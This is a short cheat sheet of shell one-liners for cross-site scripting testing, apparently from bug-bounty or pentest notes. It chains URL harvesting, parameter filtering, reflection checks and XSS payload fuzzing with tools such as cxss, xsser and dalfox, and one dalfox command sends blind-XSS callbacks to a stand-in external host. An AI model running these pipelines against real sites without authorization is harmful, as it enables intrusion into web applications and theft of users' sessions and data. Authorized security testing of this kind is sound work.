# XSS Testing

***

### XSS Discovery

#### Reflected XSS for Multiple Payload

```sh
cat live-host.txt \
  | sed -E 's,https?://(www\.)?,,; s/\r$//' \
  | urlfinder -all \
  | iconv -f ISO-8859-1 -t UTF-8 -c \
  | grep -aE '\?.*=.*(&.*)?' \
  | grep -aiEv '\.(css|ico|woff2?|svg|ttf|eot|png|jpe?g|js|json|pdf|gif|xml|webp)(?:$|\s|\?|&|#|/|\.)' \
  | awk -F'[?&=]' '!seen[$1$2]++' \
  | anew params.txt \
  && rc -p "RXSS" -o rxss.txt params.txt \
  && cxss -f rxss.txt -p "RXSS" -i "FUZZ" -s \
  | grep -E "Unfiltered\(([2-9]|1[0-4])\):" \
  | sed -E 's/URL:[[:space:]]*//I; s/ Param:.*$//' \
  | anew xss_unfilter.txt \
  && xsser -f xss_unfilter.txt -p /usr/share/wordlists/seclists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt -pl "FUZZ" -o Rxss_found.txt

```

#### Blind XSS Oneliners

```sh
cat live-host.txt \
  | sed -E 's,https?://(www\.)?,,; s/\r$//' \
  | urlfinder -all \
  | iconv -f ISO-8859-1 -t UTF-8 -c \
  | grep -aE '\?.*=.*(&.*)?' \
  | grep -aiEv '\.(css|ico|woff2?|svg|ttf|eot|png|jpe?g|js|json|pdf|gif|xml|webp)(?:$|\s|\?|&|#|/|\.)' \
  | awk -F'[?&=]' '!seen[$1$2]++' \
  | anew bxss.txt \
  && xsser -f bxss.txt -p /usr/share/wordlists/seclists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt

```

#### RXSS / BXSS Both Finder

```sh
mkdir -p --mode=755 all_xss/example.com/RXSS_BXSS \
&& urlfinder -d "example.com" -all \
  | iconv -f ISO-8859-1 -t UTF-8 -c \
  | sed -E 's/\r$//' \
  | grep -aiEv '\.(css|ico|woff2?|svg|ttf|eot|png|jpe?g|js|json|pdf|gif|xml|webp)(?:$|\s|\?|&|#|/|\.)' \
  | anew all_xss/example.com/RXSS_BXSS/all_urls.txt \
&& cat all_xss/example.com/RXSS_BXSS/all_urls.txt \
  | grep -aE '\?.*=.*(&.*)?' \
  | awk -F'[?&=]' '!seen[$1$2]++' \
  | ( command -v pvreplace >/dev/null 2>&1 && pvreplace -silent -fuzzing-type postfix || perl -pe "s/([?&][^=]+)=([^&]*)/\$1=FUZZ/g" ) \
  | anew \
  | tee all_xss/example.com/RXSS_BXSS/blind_xss_parameters.txt \
&& cat all_xss/example.com/RXSS_BXSS/all_urls.txt \
  | grep -aiE 'contact|support|chatbot|ticket|comment|feedback|forms|surveys|forums|help|login|registration|register|signin|signup' \
  | httpx -mc 200,302 -timeout 5 -duc -nc \
  | anew \
  | tee all_xss/example.com/RXSS_BXSS/blind_xss_pages.txt \
&& grep -a "FUZZ" all_xss/example.com/RXSS_BXSS/blind_xss_parameters.txt \
  | sed 's/FUZZ//g' \
  | httpx -mc 200 -timeout 5 -duc -nc \
  | rc -p "RXSS" -o all_xss/example.com/RXSS_BXSS/reflected_xss_parameters.txt \
&& cxss -f all_xss/example.com/RXSS_BXSS/reflected_xss_parameters.txt -p "RXSS" -i "FUZZ" \
  | grep -E 'Unfiltered\(([1-9]|1[0-4])\): \[[\"'\''<>\$|\(\)\`:;{} ]{2,}\]' \
  | sed -E 's/URL:[[:space:]]*//I; s/ Param:.*$//' \
  | anew \
  | tee all_xss/example.com/RXSS_BXSS/reflected_unfilter_xss_parameters.txt

```

#### Dalfox

```sh
cat xss_candidates.txt \
  | dalfox pipe \
      --silence \
      --no-spinner \
      --follow-redirects \
      --blind "https://your-xsshunter-domain.com" \
      --only-poc \
      --skip-bav \
      --timeout 10 \
      --mining-dict wordlists/params.txt \
      --output all_xss/example.com/RXSS_BXSS/reflected_xss.txt \
      --format plain
```
